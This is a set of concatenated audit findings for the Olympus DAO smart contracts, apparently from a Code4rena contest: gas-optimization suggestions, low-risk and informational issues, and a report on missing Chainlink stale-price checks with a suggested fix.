cached(Saves 1 sload) https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L240-L246 ```solidity File: /src/modules/PRICE.sol 240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned { 241:       // Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations 242:        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0) //@audit: SLOAD 1 243:            revert Price_InvalidParams();             ... 245:        // Calculate the new number of observations 246:        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency); //@audit: SLOAD 2 ```   ### PRICE.sol.changeObservationFrequency(): movingAverageDuration should be cached(Saves 1 sload) https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L266-L272 ```solidity File: /src/modules/PRICE.sol 266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned { 267:       // Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations 268:        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0) //@audit: SLOAD 1 269:            revert Price_InvalidParams();             ... 271:        // Calculate the new number of observations 272:        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_); //@audit: SLOAD 2 ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L109 ### Heart.sol.beat(): lastBeat should be cached(Saves 1 sload ~40gas , saves ~399 if we cache the result of the external call `frequency()` )  ``` Estimations without caching the frequency function: only cache lastBeat           Average Gas before:29228   Average Gas After: 29188  Estimations after caching the frequency function: lastBeat and frequency           Average Gas before:29228   Average Gas After: 28829 ```  ```solidity File: /src/policies/Heart.sol 92:    function beat() external nonReentrant { 93:        if (!active) revert Heart_BeatStopped(); 94:        if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); //@audit: lastBeat SLOAD 1             ... 102:        // Update the last beat timestamp 103:        lastBeat += frequency(); //@audit: lastBeat SLOAD 2             ... 109:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 ### Heart.sol.\_issueReward(): reward should be cached(Saves 1 sload ~94 gas)  ```solidity File: /src/policies/Heart.sol 111:    function _issueReward(address to_) internal { 112:        rewardToken.safeTransfer(to_, reward); //@audit: reward SLOAD 1 113:        emit RewardIssued(to_, reward); //@audit: reward SLOAD 2 114:    } ```  ### Other interesting places that we can utilize caching. https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L240-L262 ### Governance.sol.vote(): activeProposal.proposalId should be cached(Saves ~281 gas) ``` Average Gas Before: 61568       Average Gas After: 61287 ```  ```solidity File: /src/policies/Governance.sol 240:    function vote(bool for_) external {             ... 243:        if (activeProposal.proposalId == 0) { //@audit: activeProposal.proposalId 244:            revert NoActiveProposalDetected(); 245:        }             ... 247:        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { //@audit: activeProposal.proposalId 248:            revert UserAlreadyVoted(); 249:        }             ... 251:        if (for_) { 252:            yesVotesForProposal[activeProposal.proposalId] += userVotes; //@audit: activeProposal.proposalId 253:        } else { 254:            noVotesForProposal[activeProposal.proposalId] += userVotes; //@audit: activeProposal.proposalId 255:        }           ... 257:        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes; //@audit: activeProposal.proposalId             ... 261:        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);//@audit: activeProposal.proposalId 262:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265-L289 ### Governance.sol.executeProposal(): activeProposal.proposalId should be cached(Saves ~147gas) ``` Average Gas Before: 171376       Average Gas After: 171229 ```  ```solidity File: /src/policies/Governance.sol 265:    function executeProposal() external { 266:        uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] - 267:            noVotesForProposal[activeProposal.proposalId];             ...     276:        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);             ... 285:        emit ProposalExecuted(activeProposal.proposalId);             ... 289:    } ```  ## Internal/Private functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  Affected code:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L  ```solidity File: /src/Kernel.sol 279:    function _upgradeModule(Module newModule_) internal {  295:    function _activatePolicy(Policy policy_) internal {  325:    function _deactivatePolicy(Policy policy_) internal {  351:    function _migrateKernel(Kernel newKernel_) internal {  409:    function _pruneFromDependents(Policy policy_) internal {  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 ```solidity File: /src/policies/Heart.sol 111:    function _issueReward(address to_) internal { 112:        rewardToken.safeTransfer(to_, reward); 113:        emit RewardIssued(to_, reward); 114:    } ``` The above function is only called on [Line 106](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106)  ### Help the Optimizer by saving a storage variable's reference instead of repeatedly fetching it  To help the optimizer,declare a storage type variable and use it instead of repeatedly fetching the reference in a map or an array.  As an example, instead of repeatedly calling ```someMap[someIndex]```, save its reference like this: ```SomeStruct storage somestruct = someMap[someIndex]``` and use it.  ### TRSRY.sol.repayLoan(): reserveDebt\[token_]\[msg.sender] should be cached https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L105-L119  ```solidity File: /src/modules/TRSRY.sol 105:    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { 106:        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();   108:        // Deposit from caller first (to handle nonstandard token transfers) 109:        uint256 prevBalance = token_.balanceOf(address(this)); 110:        token_.safeTransferFrom(msg.sender, address(this), amount_);  112:        uint256 received = token_.balanceOf(address(this)) - prevBalance;  114:        // Subtract debt from caller 115:        reserveDebt[token_][msg.sender] -= received;  116:        totalDebt[token_] -= received;  118:        emit DebtRepaid(token_, msg.sender, received); 119:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L236 ### Governance.sol.activateProposal(): proposalHasBeenActivated\[proposalId_] ```solidity File: /src/policies/Governance.sol 205:    function activateProposal(uint256 proposalId_) external { 206:        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];  223:        if (proposalHasBeenActivated[proposalId_] == true) {  224:            revert ProposalAlreadyActivated(); 225:        }  233:        proposalHasBeenActivated[proposalId_] = true;   236:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L295-L314 ### Governance.sol.reclaimVotes():tokenClaimsForProposal\[proposalId_]\[msg.sender] should be cached ```solidity File: /src/policies/Governance.sol 295:    function reclaimVotes(uint256 proposalId_) external {   306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  307:            revert VotingTokensAlreadyReclaimed(); 308:        }  310:        tokenClaimsForProposal[proposalId_][msg.sender] = true;  313:    } 314: } ```   ### Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate  Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L36-L39 ```solidity File: /src/modules/TRSRY.sol 36:    mapping(ERC20 => uint256) public totalDebt;  38:    /// @notice Debt for particular token and debtor address 39:    mapping(ERC20 => mapping(address => uint256)) public reserveDebt; ```  ## Use Shift Right/Left instead of Division/Multiplication While the DIV / MUL opcode uses 5 gas, the SHR / SHL opcode only uses 3 gas. Furthermore, beware that Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting. Eventually, overflow checks are never performed for shift operations as they are done for arithmetic operations. Instead, the result is always truncated, so the calculation can be unchecked in Solidity version 0.8+  [relevant source](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible)  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372 ```solidity File: /src/policies/Operator.sol 372:            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  427:            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); ```   ### x += y costs more gas than x = x + y for state variables https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L103 ```solidity File: /src/policies/Heart.sol 103:        lastBeat += frequency(); ``` The above should be modified to  ```solidity 103:        lastBeat = lastBeat + frequency(); ```  ### Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead     When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L205 ```solidity File: /src/modules/PRICE.sol //@audit: uint48 lastObservationTime_ 205:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)   //@audit: uint48 movingAverageDuration_ 240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {  //@audit: uint48 observationFrequency_ 266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned {  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L527-L531 ```solidity File: /src/policies/Operator.sol 527:    function setCushionParams( 528:        uint32 duration_, 529:        uint32 debtBuffer_, 530:        uint32 depositInterval_ 531:    ) external onlyRole("operator_policy") {  548:     function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {  559:    function setRegenParams( 560:        uint32 wait_, 561:        uint32 threshold_, 562:        uint32 observe_ 563:    ) external onlyRole("operator_policy") {   ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L45 ```solidity File: /src/policies/PriceConfig.sol //@audit: uint48 lastObservationTime_ 45:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  //@audit: uint48 movingAverageDuration_ 58:    function changeMovingAverageDuration(uint48 movingAverageDuration_)  //@audit: uint48 observationFrequency_ 69:    function changeObservationFrequency(uint48 observationFrequency_) ```  ### Using unchecked blocks to save gas Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block [see resource](https://github.com/ethereum/solidity/issues/10695)  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136 ```solidity 136:            _movingAverage += (currentPrice - earliestPrice) / numObs; ``` The operation `currentPrice - earliestPrice` cannot underflow due to the check on [Line 135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L135) which ensures that `currentPrice` is greater than `earliestPrice` https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138 ```solidity 138:             _movingAverage -= (earliestPrice - currentPrice) / numObs; ``` The operation `earliestPrice - currentPrice` cannot underflow due to the check on [Line 135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L135) which ensures that this operation would only be perfomened if `earliestPrice` is greter than `currentPrice`  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L185 ```solidity 185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  ```  The operation ` nextObsIndex - 1` cannot underflow as it would only be perfomed if `nextObsIndex` is not equal to 0. As `nextObsIndex` is a uint if it's not equal to 0 then it must be greater than 0  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L131 ```solidity 131:        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt; 132:        else totalDebt[token_] -= oldDebt - amount_; ``` The operation  `amount_ - oldDebt` cannot underlow due the check `if (oldDebt < amount_)` that ensures that amount is greater than oldDebt before performng the operation The operation  `oldDebt - amount_` cannot underlow due the check `if (oldDebt < amount_)` that ensures that this operation would only be perfomed if `oldDebt ` is greater than `amount_`   ### Cache the length of arrays in loops (saves ~6 gas per iteration) Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  The solidity compiler will always read the length of the array during each iteration. That is,     1.if it is a storage array, this is an extra sload operation (100 additional extra gas (EIP-2929 2) for each iteration except for the first),    2.if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first),    3.if it is a calldata array, this is an extra calldataload operation (3 additional gas for each iteration except for the first)  This extra costs can be avoided by caching the array length (in stack):  When reading the length of an array,  **sload** or **mload** or **calldataload** operation is only called once and subsequently replaced by a cheap **dupN** instruction. Even though mload , calldataload and dupN have the same gas cost, mload and calldataload needs an additional dupN to put the offset in the stack, i.e., an extra 3 gas. which brings this to 6 gas   Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L276-L278 ```solidity File: /src/policies/Governance.sol 276:        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);  278:        for (uint256 step; step < instructions.length; ) { ```    **The above should be modified to** ```solidity  276:        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId); 277:        uint256 length = instructions.length; 278:        for (uint256 step; step < length; ) { ```  ### ++i costs less gas compared to i++ or i += 1  (~5 gas per iteration)  ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  i++ increments i and returns the initial value of i. Which means:  ```solidity uint i = 1;   i++; // == 1 but i == 2   ```  But ++i returns the actual incremented value:  ```solidity uint i = 1;   ++i; // == 2 and i == 2 too, so no need for a temporary variable   ```  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  Instances include:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49  ```solidity File: /src/utils/KernelUtils.sol  49:            i++;  64:            i++;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488 ```solidity File: /src/policies/Operator.sol 488:            decimals++;  ```  ### Boolean comparisons  Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true) and if(!directValue) instead of if(directValue == false) here:  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223 ```solidity File: /src/policies/Governance.sol 223:        if (proposalHasBeenActivated[proposalId_] == true) {  306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ### Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full  word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27)  Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past  **Instances affected include**  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L113  ```solidity File: /src/Kernel.sol 113:     bool public isActive;  181:     mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;  194:     mapping(address => mapping(Role => bool)) public hasRole;  197:     mapping(Role => bool) public isRole;  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62 ```solidity File: /src/modules/PRICE.sol 62:    bool public initialized;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L63 ```solidity File: /src/policies/Operator.sol 63:    bool public initialized;  66:    bool public active;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L24 ```solidity File: /src/policies/BondCallback.sol 24:    mapping(address => mapping(uint256 => bool)) public approvedMarkets;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L33 ```solidity File: /src/policies/Heart.sol 33:    bool public active; ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L105 ```solidity File: /src/policies/Governance.sol 105:    mapping(uint256 => bool) public proposalHasBeenActivated;  117:    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; ```  ### Using private rather than public for constants, saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L121-L137 ```solidity File: /src/policies/Governance.sol 121:    uint256 public constant SUBMISSION_REQUIREMENT = 100;  124:    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  127:    uint256 public constant GRACE_PERIOD = 1 weeks;  130:    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  133:    uint256 public constant EXECUTION_THRESHOLD = 33;  137:    uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89 ```solidity File: /src/policies/Operator.sol 89:    uint32 public constant FACTOR_SCALE = 1e4; ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65 ```solidity File: /src/modules/RANGE.sol 65:    uint256 public constant FACTOR_SCALE = 1e4; ``` 
## LOW RISK  ### 1) `lastBeat` might lag  The variable `lastBeat` is used to store the [timestamp of the last beat](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L35), yet it is incremented only by [`frequency()`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103). While this would work perfectly in the scenario that keeper bots are consistently calling this function with a frequency of `frequency()` for rewards, `lastBeat` may start lagging behind the actual time in the case there are some update made to the `PRICE` contract (updating observation frequency or the moving average duration) and thus `PRICE` contract is back in the `initialized == false` state which would result in [the call to `updateMovingAverage()` failing](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L97) as the function would revert when `PRICE` is not in the initialized state. This scenario would result in any calls made to the `beat` reverting, and if the `PRICE` contract is not initialized immediately (so there is some delay) after the updates, `lastBeat` would lag behind as it would start getting incremented from the old value up to  old value + multiples of `frequency()`, never reaching the actual timestamp of `beat`s. This can be solved with by making a call to `resetBeat` or by making sure the updates and initializations are done in an atomic fashion operationally, and thus we think this creates only a low risk.      ## NON-CRITICAL ### Open TODOs There are three open TODOs in this function, and according to our understanding, this function `revokePolicyApprovals` does not require a check to see if the address supplied is a deactivated policy, as `TRSRY` should be only called by policies, and thus only policies would require approvals and revoking the approval of something that is not a policy would not do anything. So, these TODOs can be removed. (https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L56)  ### TYPO There is a typo in this line (https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L126), `numbe` should be `number`.
1 Use != 0 instead of > 0 at the above mentioned codes. The variable is uint, so it will not be below 0 so it can just check != 0. != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247  2   ++I COSTS LESS GAS COMPARED TO I++  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686 3 <ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP and Increments can be unchecked The overheads outlined below are PER LOOP, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170   # Vulnerability details  ## Impact Across these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:  * [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds) * [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)  The result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider adding the missing checks for stale data.  For example: ```js (uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();  require(answer > 0, "Chainlink price <= 0");  require(answeredInRound >= roundID, "Stale price"); require(timestamp != 0, "Round not complete"); ```
## [NAZ-L1] Missing Time locks **Severity**: Low  **Context**: [`RANGE.sol#L263`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L263), [`PRICE.sol#L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240), [`PRICE.sol#L266`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266), [`Operator.sol#L516`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516), [`Operator.sol#L527`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527), [`Operator.sol#L548`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548), [`Operator.sol#L559`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L559), [`Operator.sol#L586`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L586), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: When critical parameters of systems need to be changed, it is required to broadcast the change via event emission and recommended to enforce the changes after a time-delay. This is to allow system users to be aware of such critical changes and give them an opportunity to exit or adjust their engagement with the system accordingly. None of the onlyOwner functions that change critical protocol addresses/parameters have a timelock for a time-delayed change to alert: (1) users and give them a chance to engage/exit protocol if they are not agreeable to the changes (2) team in case of compromised owner(s) and give them a chance to perform incident response.  **Recommendation**: Users may be surprised when critical parameters are changed. Furthermore, it can erode users' trust since they can’t be sure the protocol rules won’t be changed later on. Compromised owner keys may be used to change protocol addresses/parameters to benefit attackers. Without a time-delay, authorized owners have no time for any planned incident response.   ## [NAZ-L2] Missing Equivalence Checks in Setters **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L127`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L127), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`TRSRY.sol#L122`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L122), [`RANGE.sol#L242`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L242), [`RANGE.sol#L263`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L263), [`PRICE.sol#L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240), [`PRICE.sol#L266`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266), [`Operator.sol#L516`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516), [`Operator.sol#L527`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527), [`Operator.sol#L548`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548), [`Operator.sol#L559`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L559), [`Operator.sol#L586`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L586), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: Setter functions are missing checks to validate if the new value being set is the same as the current value already set in the contract. Such checks will showcase mismatches between on-chain and off-chain states.  **Recommendation**: This may hinder detecting discrepancies between on-chain and off-chain states leading to flawed assumptions of on-chain state and protocol behavior.   ## [NAZ-L3] Missing Zero-address Validation **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the protocol.  **Recommendation**: Consider adding explicit zero-address validation on input parameters of address type.   ## [NAZ-L4] Lack of Event Emission For Critical Functions **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L127`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L127), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135)  **Description**: Several functions update critical parameters that are missing event emission. These should be performed to ensure tracking of changes of such critical parameters.  **Recommendation**: Consider adding events to functions that change critical parameters.   ## [NAZ-L5] Missing Events In Initialize Functions **Severity**: Low **Context**: [`PRICE.sol#L205`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205), [`Operator.sol#L598`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L598), [`PriceConfig.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  **Description**: None of the initialize functions emit emit init-specific events. They all however have the initializer modifier (from Initializable) so that they can be called only once. Off-chain monitoring of calls to these critical functions is not possible.  **Recommendation**: It is recommended to emit events in your initialization functions.   ## [NAZ-N1] Unreachable Code **Severity** Informational **Context**: [`VOTES#L47`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L47)  **Description**: There is unreachable code that can be removed to clean up the code.  **Recommendation**: Consider removing the unreachable code to clean it up.    ## [NAZ-N2] Votes Module `ERC20` Token Name `"OlympusDAO Dummy Voting Tokens"` **Severity** Informational **Context**: 